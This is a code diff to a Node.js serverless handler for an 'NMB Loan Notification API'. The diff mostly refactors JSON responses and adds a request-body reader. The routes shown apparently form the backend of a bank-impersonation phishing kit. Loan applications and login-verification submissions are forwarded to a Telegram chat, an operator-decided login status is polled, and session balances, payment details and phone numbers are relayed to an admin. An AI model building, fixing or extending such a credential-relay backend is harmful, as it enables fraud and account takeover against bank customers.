@@ -69,6 +69,14 @@ function esc(s) {
   return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
+async function readBody(req) {
+  return new Promise((resolve) => {
+    let raw = '';
+    req.on('data', (c) => (raw += c));
+    req.on('end', () => resolve(raw));
+  });
+}
+
 async function notifyApplication(app) {
   const id = app.appId || ('APP-' + Date.now());
   const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
@@ -282,7 +290,8 @@ module.exports = async (req, res) => {
   try {
     if (!TOKEN || !CHAT_ID) {
       console.error('Missing NMB_BOT_TOKEN or NMB_CHAT_ID environment variables');
-      res.status(500).json({ error: 'Server misconfigured: missing Telegram credentials' });
+      res.setHeader('Content-Type', 'application/json');
+      res.status(500).end(JSON.stringify({ error: 'Server misconfigured: missing Telegram credentials' }));
       return;
     }
 
@@ -298,7 +307,8 @@ module.exports = async (req, res) => {
     // GET /api/setup/purge-webhook -> clear webhook to allow local polling
     if (req.method === 'GET' && url.startsWith('/api/setup/purge-webhook')) {
       tgApi('setWebhook', { url: '' }, (r) => {
-        res.status(200).json({ ok: r && r.ok, description: r && r.description });
+        res.setHeader('Content-Type', 'application/json');
+        res.status(200).end(JSON.stringify({ ok: r && r.ok, description: r && r.description }));
       });
       return;
     }
@@ -308,7 +318,8 @@ module.exports = async (req, res) => {
       const host = req.headers['x-forwarded-host'] || req.headers.host;
       const proto = req.headers['x-forwarded-proto'] || 'https';
       setWebhook(host, proto, (r) => {
-        res.status(200).json({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` });
+        res.setHeader('Content-Type', 'application/json');
+        res.status(200).end(JSON.stringify({ ok: r && r.ok, description: r && r.description, webhook: `${proto}://${host}/api` }));
       });
       return;
     }
@@ -316,26 +327,29 @@ module.exports = async (req, res) => {
     if (req.method === 'GET' && url.startsWith('/api/application/')) {
       const id = url.split('/').pop();
       const rec = await store.get(store.NS.APPS, id);
-      res.status(200).json({ status: rec ? rec.status : 'unknown' });
+      res.setHeader('Content-Type', 'application/json');
+      res.status(200).end(JSON.stringify({ status: rec ? rec.status : 'unknown' }));
       return;
     }
 
     if (req.method === 'GET' && url.startsWith('/api/login/status/')) {
       const id = url.split('/').pop();
       const rec = await store.get(store.NS.LOGIN, id);
-      res.status(200).json({
+      res.setHeader('Content-Type', 'application/json');
+      res.status(200).end(JSON.stringify({
         decided: !!rec && !!rec.decided,
         status: rec ? rec.status : 'pending',
         found: !!rec,
         sharedStore: store.shared,
         storage: store.usingKV ? 'kv' : 'local'
-      });
+      }));
       return;
     }
 
     // POST /api/session -> create session
     if (req.method === 'POST' && url === '/api/session') {
-      const p = {};
+      const raw = await readBody(req);
+      let p = {};
       try { p = JSON.parse(raw || '{}'); } catch (e) {}
       const sessionId = p.sessionId || ('SESS-' + Date.now());
       await store.set(store.NS.SESSIONS, sessionId, {
@@ -346,7 +360,8 @@ module.exports = async (req, res) => {
         pendingTrack: false,
         trackMsgId: null
       });
-      res.status(200).json({ ok: true, sessionId });
+      res.setHeader('Content-Type', 'application/json');
+      res.status(200).end(JSON.stringify({ ok: true, sessionId }));
       return;
     }
 
@@ -354,17 +369,20 @@ module.exports = async (req, res) => {
     if (req.method === 'GET' && url.startsWith('/api/session/')) {
       const id = url.split('/').pop();
       const rec = await store.get(store.NS.SESSIONS, id);
-      res.status(200).json(rec || { id, balance: 0, paymentDetails: '', profits: [] });
+      res.setHeader('Content-Type', 'application/json');
+      res.status(200).end(JSON.stringify(rec || { id, balance: 0, paymentDetails: '', profits: [] }));
       return;
     }
 
     // POST /api/track-profits -> notify admin
     if (req.method === 'POST' && url === '/api/track-profits') {
-      const p = {};
+      const raw = await readBody(req);
+      let p = {};
       try { p = JSON.parse(raw || '{}'); } catch (e) {}
       const { sessionId, phone } = p;
       if (!sessionId) {
-        res.status(400).json({ error: 'sessionId required' });
+        res.setHeader('Content-Type', 'application/json');
+        res.status(400).end(JSON.stringify({ error: 'sessionId required' }));
         return;
       }
       const rec = await store.get(store.NS.SESSIONS, sessionId) || {
@@ -382,7 +400,8 @@ module.exports = async (req, res) => {
           pushSession(sessionId, 'track-requested', { phone });
         }
       });
-      res.status(200).json({ ok: true });
+      res.setHeader('Content-Type', 'application/json');
+      res.status(200).end(JSON.stringify({ ok: true }));
       return;
     }
 
@@ -416,36 +435,48 @@ module.exports = async (req, res) => {
         try {
           if (p.callback_query) {
             await handleCallback(p.callback_query);
-            res.status(200).json({ ok: true });
+            res.setHeader('Content-Type', 'application/json');
+            res.status(200).end(JSON.stringify({ ok: true }));
             return;
           }
           if (p.message) {
             await handleMessage(p.message);
-            res.status(200).json({ ok: true });
+            res.setHeader('Content-Type', 'application/json');
+            res.status(200).end(JSON.stringify({ ok: true }));
             return;
           }
           if (url.includes('application')) {
             const id = await notifyApplication(p);
-            res.status(200).json({ ok: true, appId: id });
+            res.setHeader('Content-Type', 'application/json');
+            res.status(200).end(JSON.stringify({ ok: true, appId: id }));
             return;
           }
           if (url.includes('login')) {
             const id = await notifyLoginVerification(p);
-            res.status(200).json({ ok: true, loginId: id });
+            res.setHeader('Content-Type', 'application/json');
+            res.status(200).end(JSON.stringify({ ok: true, loginId: id }));
             return;
           }
-          res.status(404).json({ error: 'not found' });
+          res.setHeader('Content-Type', 'application/json');
+          res.status(404).end(JSON.stringify({ error: 'not found' }));
         } catch (e) {
           console.error('[api] request error:', e);
-          if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
+          if (!res.headersSent) {
+            res.setHeader('Content-Type', 'application/json');
+            res.status(500).end(JSON.stringify({ error: 'Internal server error' }));
+          }
         }
       });
       return;
     }
 
-    res.status(200).send('NMB Loan Notification API');
+    res.setHeader('Content-Type', 'text/plain');
+    res.status(200).end('NMB Loan Notification API');
   } catch (e) {
     console.error('[api] unhandled error:', e);
-    if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
+    if (!res.headersSent) {
+      res.setHeader('Content-Type', 'application/json');
+      res.status(500).end(JSON.stringify({ error: 'Internal server error' }));
+    }
   }
 };
